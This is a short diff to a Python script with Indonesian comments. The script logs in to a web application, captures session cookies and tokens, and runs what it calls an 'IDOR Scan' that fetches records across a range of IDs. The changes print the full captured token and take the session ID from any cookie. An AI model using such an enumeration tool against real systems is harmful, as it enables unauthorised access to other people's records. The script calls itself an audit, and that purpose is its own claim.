@@ -70,10 +70,11 @@ def login():
                 print("[\033[91m!\033[0m] Access Denied: Captcha atau Kredensial salah.")
                 return False
 
-        # Mendapatkan Session ID dari cookie untuk ditampilkan sebagai bukti audit
-        session_id = session.cookies.get_dict().get('PHPSESSID', 'Not Found')
+        # Mendapatkan Session ID secara dinamis dari cookie jar
+        cookies = session.cookies.get_dict()
+        session_id = cookies.get('PHPSESSID') or cookies.get('ci_session') or (list(cookies.values())[0] if cookies else 'Not Found')
         print(f"[\033[92m+\033[0m] Authentication Success.")
-        print(f"[*] Captured Token : {token_t[:10]}...")
+        print(f"[*] Captured Token : {token_t}")
         print(f"[*] Session ID     : {session_id}")
         return True
     except:
@@ -105,7 +106,7 @@ def fetch_data(id_num):
 
 def start_process(start_range, end_range):
     if login():
-        print(f"[*] Starting IDOR Scan  {start_range} to {end_range}...\n")
+        print(f"[*] Starting IDOR Scan for {end_range - start_range + 1} records...\n")
         with ThreadPoolExecutor(max_workers=1) as executor: # Menggunakan 1 worker agar stabil (satu per satu)
             executor.map(fetch_data, range(start_range, end_range + 1))
         print("\n[*] IDOR Audit Completed. Data displayed in terminal.")
